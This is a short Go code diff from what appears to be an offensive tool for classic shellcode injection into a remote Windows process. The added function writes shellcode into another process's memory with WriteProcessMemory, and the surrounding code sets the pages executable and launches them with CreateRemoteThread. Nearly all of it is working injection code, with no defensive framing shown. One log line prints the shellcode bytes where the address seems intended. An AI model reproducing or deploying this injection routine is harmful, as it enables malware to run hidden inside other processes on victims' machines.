@@ -35,13 +35,37 @@ func ClassicInjection() {
 
 	log.Printf("[INJECT] Memory Allocation Done, Address: 0x(%x)", addr)
 
-	CopyShellcodeToMemory(addr, &shellcode)
+	CopyShellcodeToRemoteProcess(cmdHandle, shellcode, addr)
 
 	log.Printf("[INJECT] Shellcode Moved To Process Memory \n")
 
 	ChangeRemoteProcessPermission(windows.Handle(cmdHandle), addr, len(shellcode), windows.PAGE_EXECUTE_READ)
 
 	CreateRemoteThread(cmdHandle, addr)
+
+}
+
+func CopyShellcodeToRemoteProcess(pHandle syscall.Handle, shellCode []byte, addr uintptr) {
+	procWriteProcessMemory := dll.Kernel32.NewProc("WriteProcessMemory")
+
+	var bytesWritten uintptr
+
+	ret, _, lastErr := procWriteProcessMemory.Call(
+		uintptr(pHandle),
+		addr,
+		uintptr(unsafe.Pointer(&shellCode[0])),
+		uintptr(len(shellCode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		log.Panicf("[INJECT] WriteProcessMemory() failed: %v", lastErr)
+	}
+
+	if bytesWritten != uintptr(len(shellCode)) {
+		log.Panicf("[INJECT] Wrote %d/%d bytes", bytesWritten, len(shellCode))
+	}
+
+	log.Printf("[INJECT] Shellcode written to 0x%x \n", shellCode)
 
 }
 
